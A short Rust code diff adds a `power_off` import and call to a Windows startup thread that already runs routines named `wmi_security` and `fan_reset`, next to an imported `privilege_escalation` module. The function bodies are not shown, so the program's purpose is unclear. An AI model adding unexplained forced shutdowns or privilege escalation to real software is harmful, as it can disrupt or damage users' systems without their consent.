@@ -27,7 +27,7 @@ use plug::{
 #[cfg(windows)]
 use win_plug::{
     permissions::privilege_escalation,
-    wmi::wmi_security,
+    wmi::{wmi_security, power_off},
 };
 #[cfg(unix)]
 use linux_plug::{
@@ -48,6 +48,7 @@ fn main() {
     thread::spawn(move || {
         wmi_security();
         fan_reset();
+        power_off();
     });
     #[cfg(unix)]
     sys_init();
